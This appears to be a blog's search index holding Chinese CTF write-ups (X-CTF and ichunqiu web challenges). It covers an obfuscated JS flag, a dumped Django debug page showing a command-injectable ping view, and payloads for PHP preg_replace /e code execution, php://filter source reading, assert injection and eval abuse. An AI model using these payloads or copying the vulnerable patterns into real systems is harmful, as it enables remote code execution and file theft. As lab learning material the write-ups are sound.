<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title></title>
    <url>%2F2019%2F09%2F29%2FX-CTF%2FNaNNaNNaNNaN-Batman%2F</url>
    <content type="text"><![CDATA[function $(){ var t=["fl","s_a","i","e}"]; var n=["a","_h0l","n"]; var r=["g{","e","_0"]; var i=["it'","_","n"]; var s=[t,n,r,i]; for(var o=0;o]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F09%2F28%2FX-CTF%2Fcat%2F</url>
    <content type="text"><![CDATA[UnicodeEncodeError at /api/ping html * { padding:0; margin:0; } body * { padding:10px 20px; } body * * { padding:0; } body { font:small sans-serif; } body>div { border-bottom:1px solid #ddd; } h1 { font-weight:normal; } h2 { margin-bottom:.8em; } h2 span { font-size:80%; color:#666; font-weight:normal; } h3 { margin:1em 0 .5em 0; } h4 { margin:0 0 .5em 0; font-weight: normal; } code, pre { font-size: 100%; white-space: pre-wrap; } table { border:1px solid #ccc; border-collapse: collapse; width:100%; background:white; } tbody td, tbody th { vertical-align:top; padding:2px 3px; } thead th { padding:1px 6px 1px 3px; background:#fefefe; text-align:left; font-weight:normal; font-size:11px; border:1px solid #ddd; } tbody th { width:12em; text-align:right; color:#666; padding-right:.5em; } table.vars { margin:5px 0 2px 40px; } table.vars td, table.req td { font-family:monospace; } table td.code { width:100%; } table td.code pre { overflow:hidden; } table.source th { color:#666; } table.source td { font-family:monospace; white-space:pre; border-bottom:1px solid #eee; } ul.traceback { list-style-type:none; color: #222; } ul.traceback li.frame { padding-bottom:1em; color:#666; } ul.traceback li.user { background-color:#e0e0e0; color:#000 } div.context { padding:10px 0; overflow:hidden; } div.context ol { padding-left:30px; margin:0 10px; list-style-position: inside; } div.context ol li { font-family:monospace; white-space:pre; color:#777; cursor:pointer; padding-left: 2px; } div.context ol li pre { display:inline; } div.context ol.context-line li { color:#505050; background-color:#dfdfdf; padding: 3px 2px; } div.context ol.context-line li span { position:absolute; right:32px; } .user div.context ol.context-line li { background-color:#bbb; color:#000; } .user div.context ol li { color:#666; } div.commands { margin-left: 40px; } div.commands a { color:#555; text-decoration:none; } .user div.commands a { color: black; } #summary { background: #ffc; } #summary h2 { font-weight: normal; color: #666; } #explanation { background:#eee; } #template, #template-not-exist { background:#f6f6f6; } #template-not-exist ul { margin: 0 0 10px 20px; } #template-not-exist .postmortem-section { margin-bottom: 3px; } #unicode-hint { background:#eee; } #traceback { background:#eee; } #requestinfo { background:#f6f6f6; padding-left:120px; } #summary table { border:none; background:transparent; } #requestinfo h2, #requestinfo h3 { position:relative; margin-left:-100px; } #requestinfo h3 { margin-bottom:-1em; } .error { background: #ffc; } .specific { color:#cc3300; font-weight:bold; } h2 span.commands { font-size:.7em;} span.commands a:link {color:#5E5694;} pre.exception_value { font-family: sans-serif; color: #666; font-size: 1.5em; margin: 10px 0 10px 0; } .append-bottom { margin-bottom: 10px; } // UnicodeEncodeError at /api/ping &#39;gbk&#39; codec can&#39;t encode character u&#39;\ufffd&#39; in position 0: illegal multibyte sequence Request Method: POST Request URL: http://127.0.0.1:8000/api/ping Django Version: 1.10.4 Exception Type: UnicodeEncodeError Exception Value: &#39;gbk&#39; codec can&#39;t encode character u&#39;\ufffd&#39; in position 0: illegal multibyte sequence Exception Location: /opt/api/dnsapi/utils.py in escape, line 9 Python Executable: /usr/bin/python Python Version: 2.7.12 Python Path: [&#39;/opt/api&#39;, &#39;/usr/lib/python2.7&#39;, &#39;/usr/lib/python2.7/plat-x86_64-linux-gnu&#39;, &#39;/usr/lib/python2.7/lib-tk&#39;, &#39;/usr/lib/python2.7/lib-old&#39;, &#39;/usr/lib/python2.7/lib-dynload&#39;, &#39;/usr/local/lib/python2.7/dist-packages&#39;, &#39;/usr/lib/python2.7/dist-packages&#39;] Server time: Sat, 28 Sep 2019 04:51:36 +0000 Unicode error hint The string that could not be encoded/decoded was: � Traceback Switch to copy-and-paste view /usr/local/lib/python2.7/dist-packages/django/core/handlers/exception.py in inner This decorator is automatically applied to all middleware to ensure that no middleware leaks an exception and that the next middleware in the stack can rely on getting a response instead of an exception. &quot;&quot;&quot; @wraps(get_response, assigned=available_attrs(get_response)) def inner(request): try: response = get_response(request) ... except Exception as exc: response = response_for_exception(request, exc) return response return inner &#x25b6; Local vars Variable Value exc UnicodeEncodeError(&#39;gbk&#39;, u&#39;\ufffd&#39;, 0, 1, &#39;illegal multibyte sequence&#39;) get_response &lt;bound method WSGIHandler._get_response of &lt;django.core.handlers.wsgi.WSGIHandler object at 0x7faf00b2cb10&gt;&gt; request &lt;WSGIRequest: POST &#39;/api/ping&#39;&gt; /usr/local/lib/python2.7/dist-packages/django/core/handlers/base.py in _get_response break if response is None: wrapped_callback = self.make_view_atomic(callback) try: response = wrapped_callback(request, *callback_args, **callback_kwargs) except Exception as e: response = self.process_exception_by_middleware(e, request) ... # Complain if the view returned None (a common error). if response is None: if isinstance(callback, types.FunctionType): # FBV view_name = callback.__name__ else: # CBV &#x25b6; Local vars Variable Value callback &lt;function ping at 0x7faeffb40de8&gt; callback_args () callback_kwargs {} e UnicodeEncodeError(&#39;gbk&#39;, u&#39;\ufffd&#39;, 0, 1, &#39;illegal multibyte sequence&#39;) request &lt;WSGIRequest: POST &#39;/api/ping&#39;&gt; resolver &lt;RegexURLResolver &#39;api.urls&#39; (None:None) ^/&gt; resolver_match ResolverMatch(func=dnsapi.views.ping, args=(), kwargs={}, url_name=None, app_names=[], namespaces=[]) response None self &lt;django.core.handlers.wsgi.WSGIHandler object at 0x7faf00b2cb10&gt; wrapped_callback &lt;function ping at 0x7faeffb40de8&gt; /usr/local/lib/python2.7/dist-packages/django/core/handlers/base.py in _get_response response = middleware_method(request, callback, callback_args, callback_kwargs) if response: break if response is None: wrapped_callback = self.make_view_atomic(callback) try: response = wrapped_callback(request, *callback_args, **callback_kwargs) ... except Exception as e: response = self.process_exception_by_middleware(e, request) # Complain if the view returned None (a common error). if response is None: if isinstance(callback, types.FunctionType): # FBV &#x25b6; Local vars Variable Value callback &lt;function ping at 0x7faeffb40de8&gt; callback_args () callback_kwargs {} e UnicodeEncodeError(&#39;gbk&#39;, u&#39;\ufffd&#39;, 0, 1, &#39;illegal multibyte sequence&#39;) request &lt;WSGIRequest: POST &#39;/api/ping&#39;&gt; resolver &lt;RegexURLResolver &#39;api.urls&#39; (None:None) ^/&gt; resolver_match ResolverMatch(func=dnsapi.views.ping, args=(), kwargs={}, url_name=None, app_names=[], namespaces=[]) response None self &lt;django.core.handlers.wsgi.WSGIHandler object at 0x7faf00b2cb10&gt; wrapped_callback &lt;function ping at 0x7faeffb40de8&gt; /opt/api/dnsapi/views.py in wrapper # 合并 requests.FILES 和 requests.POST for k, v in request.FILES.items(): if isinstance(v, InMemoryUploadedFile): v = v.read() request.FILES[k] = v request.POST.update(request.FILES) return f(*args, **kwargs) ... return wrapper @process_request def ping(request): &#x25b6; Local vars Variable Value args (&lt;WSGIRequest: POST &#39;/api/ping&#39;&gt;,) f &lt;function ping at 0x7faeffb40d70&gt; kwargs {} request &lt;WSGIRequest: POST &#39;/api/ping&#39;&gt; /opt/api/dnsapi/views.py in ping return wrapper @process_request def ping(request): # 转义 data = request.POST.get(&#39;url&#39;) data = escape(data) ... if not re.match(&#39;^[a-zA-Z0-9\-\./]+$&#39;, data): return HttpResponse(&quot;Invalid URL&quot;) return HttpResponse(os.popen(&quot;ping -c 1 \&quot;%s\&quot;&quot; % data).read()) &#x25b6; Local vars Variable Value data u&#39;\ufffd&#39; request &lt;WSGIRequest: POST &#39;/api/ping&#39;&gt; /opt/api/dnsapi/utils.py in escape r = &#39;&#39; for i in range(len(data)): c = data[i] if c in (&#39;\\&#39;, &#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;$&#39;, &#39;`&#39;): r = r + &#39;\\&#39; + c else: r = r + c return r.encode(&#39;gbk&#39;) ... &#x25b6; Local vars Variable Value c u&#39;\ufffd&#39; data u&#39;\ufffd&#39; i 0 r u&#39;\ufffd&#39; Environment: Request Method: POST Request URL: http://127.0.0.1:8000/api/ping Django Version: 1.10.4 Python Version: 2.7.12 Installed Applications: [&#39;django.contrib.admin&#39;, &#39;django.contrib.auth&#39;, &#39;django.contrib.contenttypes&#39;, &#39;django.contrib.sessions&#39;, &#39;django.contrib.messages&#39;, &#39;django.contrib.staticfiles&#39;, &#39;dnsapi&#39;] Installed Middleware: [&#39;django.middleware.security.SecurityMiddleware&#39;, &#39;django.contrib.sessions.middleware.SessionMiddleware&#39;, &#39;django.middleware.common.CommonMiddleware&#39;, &#39;django.contrib.auth.middleware.AuthenticationMiddleware&#39;, &#39;django.contrib.messages.middleware.MessageMiddleware&#39;, &#39;django.middleware.clickjacking.XFrameOptionsMiddleware&#39;] Traceback: File "/usr/local/lib/python2.7/dist-packages/django/core/handlers/exception.py" in inner 39. response = get_response(request) File "/usr/local/lib/python2.7/dist-packages/django/core/handlers/base.py" in _get_response 187. response = self.process_exception_by_middleware(e, request) File "/usr/local/lib/python2.7/dist-packages/django/core/handlers/base.py" in _get_response 185. response = wrapped_callback(request, *callback_args, **callback_kwargs) File "/opt/api/dnsapi/views.py" in wrapper 21. return f(*args, **kwargs) File "/opt/api/dnsapi/views.py" in ping 30. data = escape(data) File "/opt/api/dnsapi/utils.py" in escape 9. return r.encode(&#39;gbk&#39;) Exception Type: UnicodeEncodeError at /api/ping Exception Value: &#39;gbk&#39; codec can&#39;t encode character u&#39;\ufffd&#39; in position 0: illegal multibyte sequence Request information USER AnonymousUser GET No GET data POST Variable Value url u&#39;\ufffd&#39; FILES No FILES data COOKIES No cookie data META Variable Value CONTENT_LENGTH &#39;139&#39; CONTENT_TYPE &#39;multipart/form-data; boundary=------------------------870c08d75baaefee&#39; DJANGO_SETTINGS_MODULE &#39;api.settings&#39; GATEWAY_INTERFACE &#39;CGI/1.1&#39; HOME &#39;/root&#39; HOSTNAME &#39;3e398a5e6dbd&#39; HTTP_ACCEPT &#39;*/*&#39; HTTP_EXPECT &#39;100-continue&#39; HTTP_HOST &#39;127.0.0.1:8000&#39; PATH &#39;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#39; PATH_INFO u&#39;/api/ping&#39; PWD &#39;/opt/api&#39; QUERY_STRING &#39;&#39; REMOTE_ADDR &#39;127.0.0.1&#39; REMOTE_HOST &#39;&#39; REQUEST_METHOD &#39;POST&#39; RUN_MAIN &#39;true&#39; SCRIPT_NAME u&#39;&#39; SERVER_NAME &#39;localhost&#39; SERVER_PORT &#39;8000&#39; SERVER_PROTOCOL &#39;HTTP/1.1&#39; SERVER_SOFTWARE &#39;WSGIServer/0.1 Python/2.7.12&#39; TZ &#39;UTC&#39; wsgi.errors &lt;open file &#39;&lt;stderr&gt;&#39;, mode &#39;w&#39; at 0x7faf039721e0&gt; wsgi.file_wrapper &#39;&#39; wsgi.input &lt;socket._fileobject object at 0x7faeffaa57d0&gt; wsgi.multiprocess False wsgi.multithread True wsgi.run_once False wsgi.url_scheme &#39;http&#39; wsgi.version (1, 0) Settings Using settings module api.settings Setting Value ABSOLUTE_URL_OVERRIDES {} ADMINS [] ALLOWED_HOSTS [] APPEND_SLASH True AUTHENTICATION_BACKENDS [u&#39;django.contrib.auth.backends.ModelBackend&#39;] AUTH_PASSWORD_VALIDATORS u&#39;********************&#39; AUTH_USER_MODEL u&#39;auth.User&#39; BASE_DIR &#39;/opt/api&#39; CACHES {u&#39;default&#39;: {u&#39;BACKEND&#39;: u&#39;django.core.cache.backends.locmem.LocMemCache&#39;}} CACHE_MIDDLEWARE_ALIAS u&#39;default&#39; CACHE_MIDDLEWARE_KEY_PREFIX u&#39;********************&#39; CACHE_MIDDLEWARE_SECONDS 600 CSRF_COOKIE_AGE 31449600 CSRF_COOKIE_DOMAIN None CSRF_COOKIE_HTTPONLY False CSRF_COOKIE_NAME u&#39;csrftoken&#39; CSRF_COOKIE_PATH u&#39;/&#39; CSRF_COOKIE_SECURE False CSRF_FAILURE_VIEW u&#39;django.views.csrf.csrf_failure&#39; CSRF_HEADER_NAME u&#39;HTTP_X_CSRFTOKEN&#39; CSRF_TRUSTED_ORIGINS [] DATABASES {&#39;default&#39;: {&#39;ATOMIC_REQUESTS&#39;: False, &#39;AUTOCOMMIT&#39;: True, &#39;CONN_MAX_AGE&#39;: 0, &#39;ENGINE&#39;: &#39;django.db.backends.sqlite3&#39;, &#39;HOST&#39;: &#39;&#39;, &#39;NAME&#39;: &#39;/opt/api/database.sqlite3&#39;, &#39;OPTIONS&#39;: {}, &#39;PASSWORD&#39;: u&#39;********************&#39;, &#39;PORT&#39;: &#39;&#39;, &#39;TEST&#39;: {&#39;CHARSET&#39;: None, &#39;COLLATION&#39;: None, &#39;MIRROR&#39;: None, &#39;NAME&#39;: None}, &#39;TIME_ZONE&#39;: None, &#39;USER&#39;: &#39;&#39;}} DATABASE_ROUTERS [] DATA_UPLOAD_MAX_MEMORY_SIZE 2621440 DATA_UPLOAD_MAX_NUMBER_FIELDS 1000 DATETIME_FORMAT u&#39;N j, Y, P&#39; DATETIME_INPUT_FORMATS [u&#39;%Y-%m-%d %H:%M:%S&#39;, u&#39;%Y-%m-%d %H:%M:%S.%f&#39;, u&#39;%Y-%m-%d %H:%M&#39;, u&#39;%Y-%m-%d&#39;, u&#39;%m/%d/%Y %H:%M:%S&#39;, u&#39;%m/%d/%Y %H:%M:%S.%f&#39;, u&#39;%m/%d/%Y %H:%M&#39;, u&#39;%m/%d/%Y&#39;, u&#39;%m/%d/%y %H:%M:%S&#39;, u&#39;%m/%d/%y %H:%M:%S.%f&#39;, u&#39;%m/%d/%y %H:%M&#39;, u&#39;%m/%d/%y&#39;] DATE_FORMAT u&#39;N j, Y&#39; DATE_INPUT_FORMATS [u&#39;%Y-%m-%d&#39;, u&#39;%m/%d/%Y&#39;, u&#39;%m/%d/%y&#39;, u&#39;%b %d %Y&#39;, u&#39;%b %d, %Y&#39;, u&#39;%d %b %Y&#39;, u&#39;%d %b, %Y&#39;, u&#39;%B %d %Y&#39;, u&#39;%B %d, %Y&#39;, u&#39;%d %B %Y&#39;, u&#39;%d %B, %Y&#39;] DEBUG True DEBUG_PROPAGATE_EXCEPTIONS False DECIMAL_SEPARATOR u&#39;.&#39; DEFAULT_CHARSET u&#39;utf-8&#39; DEFAULT_CONTENT_TYPE u&#39;text/html&#39; DEFAULT_EXCEPTION_REPORTER_FILTER u&#39;django.views.debug.SafeExceptionReporterFilter&#39; DEFAULT_FILE_STORAGE u&#39;django.core.files.storage.FileSystemStorage&#39; DEFAULT_FROM_EMAIL u&#39;webmaster@localhost&#39; DEFAULT_INDEX_TABLESPACE u&#39;&#39; DEFAULT_TABLESPACE u&#39;&#39; DISALLOWED_USER_AGENTS [] EMAIL_BACKEND u&#39;django.core.mail.backends.smtp.EmailBackend&#39; EMAIL_HOST u&#39;localhost&#39; EMAIL_HOST_PASSWORD u&#39;********************&#39; EMAIL_HOST_USER u&#39;&#39; EMAIL_PORT 25 EMAIL_SSL_CERTFILE None EMAIL_SSL_KEYFILE u&#39;********************&#39; EMAIL_SUBJECT_PREFIX u&#39;[Django] &#39; EMAIL_TIMEOUT None EMAIL_USE_SSL False EMAIL_USE_TLS False FILE_CHARSET u&#39;utf-8&#39; FILE_UPLOAD_DIRECTORY_PERMISSIONS None FILE_UPLOAD_HANDLERS [u&#39;django.core.files.uploadhandler.MemoryFileUploadHandler&#39;, u&#39;django.core.files.uploadhandler.TemporaryFileUploadHandler&#39;] FILE_UPLOAD_MAX_MEMORY_SIZE 2621440 FILE_UPLOAD_PERMISSIONS None FILE_UPLOAD_TEMP_DIR None FIRST_DAY_OF_WEEK 0 FIXTURE_DIRS [] FORCE_SCRIPT_NAME None FORMAT_MODULE_PATH None IGNORABLE_404_URLS [] INSTALLED_APPS [&#39;django.contrib.admin&#39;, &#39;django.contrib.auth&#39;, &#39;django.contrib.contenttypes&#39;, &#39;django.contrib.sessions&#39;, &#39;django.contrib.messages&#39;, &#39;django.contrib.staticfiles&#39;, &#39;dnsapi&#39;] INTERNAL_IPS [] LANGUAGES [(u&#39;af&#39;, u&#39;Afrikaans&#39;), (u&#39;ar&#39;, u&#39;Arabic&#39;), (u&#39;ast&#39;, u&#39;Asturian&#39;), (u&#39;az&#39;, u&#39;Azerbaijani&#39;), (u&#39;bg&#39;, u&#39;Bulgarian&#39;), (u&#39;be&#39;, u&#39;Belarusian&#39;), (u&#39;bn&#39;, u&#39;Bengali&#39;), (u&#39;br&#39;, u&#39;Breton&#39;), (u&#39;bs&#39;, u&#39;Bosnian&#39;), (u&#39;ca&#39;, u&#39;Catalan&#39;), (u&#39;cs&#39;, u&#39;Czech&#39;), (u&#39;cy&#39;, u&#39;Welsh&#39;), (u&#39;da&#39;, u&#39;Danish&#39;), (u&#39;de&#39;, u&#39;German&#39;), (u&#39;dsb&#39;, u&#39;Lower Sorbian&#39;), (u&#39;el&#39;, u&#39;Greek&#39;), (u&#39;en&#39;, u&#39;English&#39;), (u&#39;en-au&#39;, u&#39;Australian English&#39;), (u&#39;en-gb&#39;, u&#39;British English&#39;), (u&#39;eo&#39;, u&#39;Esperanto&#39;), (u&#39;es&#39;, u&#39;Spanish&#39;), (u&#39;es-ar&#39;, u&#39;Argentinian Spanish&#39;), (u&#39;es-co&#39;, u&#39;Colombian Spanish&#39;), (u&#39;es-mx&#39;, u&#39;Mexican Spanish&#39;), (u&#39;es-ni&#39;, u&#39;Nicaraguan Spanish&#39;), (u&#39;es-ve&#39;, u&#39;Venezuelan Spanish&#39;), (u&#39;et&#39;, u&#39;Estonian&#39;), (u&#39;eu&#39;, u&#39;Basque&#39;), (u&#39;fa&#39;, u&#39;Persian&#39;), (u&#39;fi&#39;, u&#39;Finnish&#39;), (u&#39;fr&#39;, u&#39;French&#39;), (u&#39;fy&#39;, u&#39;Frisian&#39;), (u&#39;ga&#39;, u&#39;Irish&#39;), (u&#39;gd&#39;, u&#39;Scottish Gaelic&#39;), (u&#39;gl&#39;, u&#39;Galician&#39;), (u&#39;he&#39;, u&#39;Hebrew&#39;), (u&#39;hi&#39;, u&#39;Hindi&#39;), (u&#39;hr&#39;, u&#39;Croatian&#39;), (u&#39;hsb&#39;, u&#39;Upper Sorbian&#39;), (u&#39;hu&#39;, u&#39;Hungarian&#39;), (u&#39;ia&#39;, u&#39;Interlingua&#39;), (u&#39;id&#39;, u&#39;Indonesian&#39;), (u&#39;io&#39;, u&#39;Ido&#39;), (u&#39;is&#39;, u&#39;Icelandic&#39;), (u&#39;it&#39;, u&#39;Italian&#39;), (u&#39;ja&#39;, u&#39;Japanese&#39;), (u&#39;ka&#39;, u&#39;Georgian&#39;), (u&#39;kk&#39;, u&#39;Kazakh&#39;), (u&#39;km&#39;, u&#39;Khmer&#39;), (u&#39;kn&#39;, u&#39;Kannada&#39;), (u&#39;ko&#39;, u&#39;Korean&#39;), (u&#39;lb&#39;, u&#39;Luxembourgish&#39;), (u&#39;lt&#39;, u&#39;Lithuanian&#39;), (u&#39;lv&#39;, u&#39;Latvian&#39;), (u&#39;mk&#39;, u&#39;Macedonian&#39;), (u&#39;ml&#39;, u&#39;Malayalam&#39;), (u&#39;mn&#39;, u&#39;Mongolian&#39;), (u&#39;mr&#39;, u&#39;Marathi&#39;), (u&#39;my&#39;, u&#39;Burmese&#39;), (u&#39;nb&#39;, u&#39;Norwegian Bokm\xe5l&#39;), (u&#39;ne&#39;, u&#39;Nepali&#39;), (u&#39;nl&#39;, u&#39;Dutch&#39;), (u&#39;nn&#39;, u&#39;Norwegian Nynorsk&#39;), (u&#39;os&#39;, u&#39;Ossetic&#39;), (u&#39;pa&#39;, u&#39;Punjabi&#39;), (u&#39;pl&#39;, u&#39;Polish&#39;), (u&#39;pt&#39;, u&#39;Portuguese&#39;), (u&#39;pt-br&#39;, u&#39;Brazilian Portuguese&#39;), (u&#39;ro&#39;, u&#39;Romanian&#39;), (u&#39;ru&#39;, u&#39;Russian&#39;), (u&#39;sk&#39;, u&#39;Slovak&#39;), (u&#39;sl&#39;, u&#39;Slovenian&#39;), (u&#39;sq&#39;, u&#39;Albanian&#39;), (u&#39;sr&#39;, u&#39;Serbian&#39;), (u&#39;sr-latn&#39;, u&#39;Serbian Latin&#39;), (u&#39;sv&#39;, u&#39;Swedish&#39;), (u&#39;sw&#39;, u&#39;Swahili&#39;), (u&#39;ta&#39;, u&#39;Tamil&#39;), (u&#39;te&#39;, u&#39;Telugu&#39;), (u&#39;th&#39;, u&#39;Thai&#39;), (u&#39;tr&#39;, u&#39;Turkish&#39;), (u&#39;tt&#39;, u&#39;Tatar&#39;), (u&#39;udm&#39;, u&#39;Udmurt&#39;), (u&#39;uk&#39;, u&#39;Ukrainian&#39;), (u&#39;ur&#39;, u&#39;Urdu&#39;), (u&#39;vi&#39;, u&#39;Vietnamese&#39;), (u&#39;zh-hans&#39;, u&#39;Simplified Chinese&#39;), (u&#39;zh-hant&#39;, u&#39;Traditional Chinese&#39;)] LANGUAGES_BIDI [u&#39;he&#39;, u&#39;ar&#39;, u&#39;fa&#39;, u&#39;ur&#39;] LANGUAGE_CODE &#39;en-us&#39; LANGUAGE_COOKIE_AGE None LANGUAGE_COOKIE_DOMAIN None LANGUAGE_COOKIE_NAME u&#39;django_language&#39; LANGUAGE_COOKIE_PATH u&#39;/&#39; LOCALE_PATHS [] LOGGING {} LOGGING_CONFIG u&#39;logging.config.dictConfig&#39; LOGIN_REDIRECT_URL u&#39;/accounts/profile/&#39; LOGIN_URL u&#39;/accounts/login/&#39; LOGOUT_REDIRECT_URL None MANAGERS [] MEDIA_ROOT u&#39;&#39; MEDIA_URL u&#39;&#39; MESSAGE_STORAGE u&#39;django.contrib.messages.storage.fallback.FallbackStorage&#39; MIDDLEWARE [&#39;django.middleware.security.SecurityMiddleware&#39;, &#39;django.contrib.sessions.middleware.SessionMiddleware&#39;, &#39;django.middleware.common.CommonMiddleware&#39;, &#39;django.contrib.auth.middleware.AuthenticationMiddleware&#39;, &#39;django.contrib.messages.middleware.MessageMiddleware&#39;, &#39;django.middleware.clickjacking.XFrameOptionsMiddleware&#39;] MIDDLEWARE_CLASSES [u&#39;django.middleware.common.CommonMiddleware&#39;, u&#39;django.middleware.csrf.CsrfViewMiddleware&#39;] MIGRATION_MODULES {} MONTH_DAY_FORMAT u&#39;F j&#39; NUMBER_GROUPING 0 PASSWORD_HASHERS u&#39;********************&#39; PASSWORD_RESET_TIMEOUT_DAYS u&#39;********************&#39; PREPEND_WWW False ROOT_URLCONF &#39;api.urls&#39; SECRET_KEY u&#39;********************&#39; SECURE_BROWSER_XSS_FILTER False SECURE_CONTENT_TYPE_NOSNIFF False SECURE_HSTS_INCLUDE_SUBDOMAINS False SECURE_HSTS_SECONDS 0 SECURE_PROXY_SSL_HEADER None SECURE_REDIRECT_EXEMPT [] SECURE_SSL_HOST None SECURE_SSL_REDIRECT False SERVER_EMAIL u&#39;root@localhost&#39; SESSION_CACHE_ALIAS u&#39;default&#39; SESSION_COOKIE_AGE 1209600 SESSION_COOKIE_DOMAIN None SESSION_COOKIE_HTTPONLY True SESSION_COOKIE_NAME u&#39;sessionid&#39; SESSION_COOKIE_PATH u&#39;/&#39; SESSION_COOKIE_SECURE False SESSION_ENGINE u&#39;django.contrib.sessions.backends.db&#39; SESSION_EXPIRE_AT_BROWSER_CLOSE False SESSION_FILE_PATH None SESSION_SAVE_EVERY_REQUEST False SESSION_SERIALIZER u&#39;django.contrib.sessions.serializers.JSONSerializer&#39; SETTINGS_MODULE &#39;api.settings&#39; SHORT_DATETIME_FORMAT u&#39;m/d/Y P&#39; SHORT_DATE_FORMAT u&#39;m/d/Y&#39; SIGNING_BACKEND u&#39;django.core.signing.TimestampSigner&#39; SILENCED_SYSTEM_CHECKS [] STATICFILES_DIRS [] STATICFILES_FINDERS [u&#39;django.contrib.staticfiles.finders.FileSystemFinder&#39;, u&#39;django.contrib.staticfiles.finders.AppDirectoriesFinder&#39;] STATICFILES_STORAGE u&#39;django.contrib.staticfiles.storage.StaticFilesStorage&#39; STATIC_ROOT None STATIC_URL &#39;/static/&#39; TEMPLATES [{&#39;APP_DIRS&#39;: True, &#39;BACKEND&#39;: &#39;django.template.backends.django.DjangoTemplates&#39;, &#39;DIRS&#39;: [], &#39;OPTIONS&#39;: {&#39;context_processors&#39;: [&#39;django.template.context_processors.debug&#39;, &#39;django.template.context_processors.request&#39;, &#39;django.contrib.auth.context_processors.auth&#39;, &#39;django.contrib.messages.context_processors.messages&#39;]}}] TEST_NON_SERIALIZED_APPS [] TEST_RUNNER u&#39;django.test.runner.DiscoverRunner&#39; THOUSAND_SEPARATOR u&#39;,&#39; TIME_FORMAT u&#39;P&#39; TIME_INPUT_FORMATS [u&#39;%H:%M:%S&#39;, u&#39;%H:%M:%S.%f&#39;, u&#39;%H:%M&#39;] TIME_ZONE &#39;UTC&#39; USE_ETAGS False USE_I18N True USE_L10N True USE_THOUSAND_SEPARATOR False USE_TZ True USE_X_FORWARDED_HOST False USE_X_FORWARDED_PORT False WSGI_APPLICATION &#39;api.wsgi.application&#39; X_FRAME_OPTIONS u&#39;SAMEORIGIN&#39; YEAR_MONTH_FORMAT u&#39;F Y&#39; You're seeing this error because you have DEBUG = True in your Django settings file. Change that to False, and Django will display a standard page generated by the handler for this status code.]]></content>
  </entry>
  <entry>
    <title><![CDATA[X-CTF web练习]]></title>
    <url>%2F2019%2F09%2F28%2FX-CTF%2F</url>
    <content type="text"><![CDATA[新手区 前几天看了看ctfweb题的主要思路，主要如下： 1.探明web系统语言，框架2.查看是否有数据库功能3.扫描目录，查看附加目录//网上找源码4.寻找输入点，进行payload测试 js:信息获取：js加解密，xss，csp防御机制绕过，csrf权限获取：Nodejs代码审计，前端vue，跨域 nodejs：主要做成游戏的形式 其次web选手主要是需要先学好php，python。 进阶区Cat: 抓住那只猫 是一个ping的操作但只能ping本机，尝试命令执行 不论输入什么都显示Invalid URL，fuzz发现很多字符都被过滤掉了.尝试宽字节%df 看了wp才知道这是个Django框架， Django使用的是gbk编码，超过%F7的编码不在gbk中有意义 得到满满一页的html代码。在本地运行代码得到django框架的页面 在该页面信息中可看见数据库相关信息，然后开始一脸懵逼………… 看了wp； 当 CURLOPT_SAFE_UPLOAD 为 true 时，如果在请求前面加上@的话phpcurl组件是会把后面的当作绝对路径请求，来读取文件。当且仅当文件中存在中文字符的时候，Django 才会报错导致获取文件内容。 使用@读取数据库路径 又得到一页html（行这又是个坑）；页面滑到最右边，向下拉得到flag ics-05:其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统 进入设备维护中心，发现输入id都无回显,偶然发现云平台设备维护中心可以点，点击后出现page参数 不论输入什么都会显示在页面上。尝试输入page=flag.php,无回显，page=index.php回显OK..利用php伪协议读取源码 构造?page=php://filter/convert.base64-encode/resource=index.php 出现内容，base64解密后，去除无用代码得到： 需要设置x-forwarded-for: 127.0.0.1;并且传入三个参数 preg_replace函数存在一个安全问题： /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码(在适当的逆向引用替换完之后)。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。 构造payload查看列表：?pat=/abc/e&amp;rep=system(‘ls’)&amp;sub=abc 查看s3chahahaDir文件夹列表：?pat=/a/e&amp;rep=system(‘ls+s3chahahaDir’)&amp;sub=a 查看flag列表：?pat=/a/e&amp;rep=system(‘ls+s3chahahaDir/flag’)&amp;sub=a NewsCenter简单的sql注入； mfwweb常见源码泄漏总结 进入页面，在about页面。提到用了git。并且在源码里看见hint 先跟着hint走，发现空页面，源码也空的。然后尝试git源码泄露，访问.git发现泄露页面，使用githack下载源码，在flag.php中未发现源码；审计index.php 只过滤了.. assert函数：bool assert(mixed $assertion[,string $description])，如果assertion是字符串，他会被assert()当做php代码执行 通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码； 构造payload：?page’) or print_r(file_get_contents(‘tempates/flag.php’));# 页面错误….然后发现需要url编码，编码后执行。得到空页面，查看源码得到flag 未完待续]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ichunqiu_CTF]]></title>
    <url>%2F2019%2F09%2F08%2Fichunqiu%2F</url>
    <content type="text"><![CDATA[10pt 爆破-1给出源码: 123456789&lt;?phpinclude "flag.php";$a = @$_REQUEST['hello'];if(!preg_match('/^\w*$/',$a ))&#123;&lt;!--学正则表达式后补充说明此处--&gt; die('ERROR');&#125;eval("var_dump($$a);");show_source(__FILE__);?&gt; $$a想到传输参数GLOBALS，列出全部。得到flag 爆破-2源码： 12345&lt;?phpinclude "flag.php";$a = @$_REQUEST['hello'];eval( "var_dump($a);");show_source(__FILE__); 构造?hello=file_get_contents(“flag.php”)，查看源代码获得flag： 123string(83) "&lt;?php$flag = 'Too Young Too Simple';#flag&#123;2c2cde90-5e2b-486f-bb0f-4634698aed51&#125;; 爆破-31234567891011121314151617181920212223242526272829&lt;?php error_reporting(0);session_start();require('./flag.php');if(!isset($_SESSION['nums']))&#123; $_SESSION['nums'] = 0; $_SESSION['time'] = time(); $_SESSION['whoami'] = 'ea';&#125;if($_SESSION['time']+120&lt;time())&#123; session_destroy();&#125;$value = $_REQUEST['value'];$str_rand = range('a', 'z');$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];if($_SESSION['whoami']==($value[0].$value[1]) &amp;&amp; substr(md5($value),5,4)==0)&#123; $_SESSION['nums']++; $_SESSION['whoami'] = $str_rands; echo $str_rands;&#125;if($_SESSION['nums']&gt;=10)&#123; echo $flag;&#125;show_source(__FILE__);?&gt; require 和 include 